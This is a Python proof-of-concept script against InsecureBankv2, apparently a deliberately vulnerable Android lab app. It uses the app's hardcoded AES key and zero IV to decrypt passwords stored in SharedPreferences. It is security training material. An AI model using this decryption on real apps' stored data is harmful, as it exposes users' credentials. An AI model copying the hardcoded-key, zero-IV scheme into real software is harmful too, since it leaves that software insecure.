#!/usr/bin/env python3
"""
InsecureBankv2 — Hardcoded AES Key Decryption PoC
CryptoClass.java: key = "This is the super secret key 123", IV = 0x00*16
Any ciphertext stored in SharedPreferences can be trivially decrypted.
"""
import base64
import sys
from Crypto.Cipher import AES

KEY = b"This is the super secret key 123"  # from CryptoClass.java line 22
IV  = b"\x00" * 16                          # all-zero IV, line 23

def decrypt(b64_ciphertext: str) -> str:
    ct = base64.b64decode(b64_ciphertext)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    pt = cipher.decrypt(ct)
    # strip PKCS5 padding
    return pt[:-pt[-1]].decode("utf-8")

def encrypt(plaintext: str) -> str:
    pt = plaintext.encode("utf-8")
    pad = 16 - len(pt) % 16
    pt += bytes([pad] * pad)
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pt)).decode()

if __name__ == "__main__":
    # Demo: encrypt a known password, then decrypt it back
    test_passwords = ["Dinesh@123!", "Jack@123!", "admin", "password123"]
    print(f"{'Plaintext':<20} {'AES-256-CBC Ciphertext (base64)':<50} {'Decrypted'}")
    print("-" * 90)
    for pw in test_passwords:
        ct = encrypt(pw)
        pt = decrypt(ct)
        print(f"{pw:<20} {ct:<50} {pt}")

    # If SharedPreferences ciphertext passed as arg, decrypt it
    if len(sys.argv) > 1:
        print(f"\nDecrypting provided ciphertext: {sys.argv[1]}")
        print(f"Plaintext: {decrypt(sys.argv[1])}")
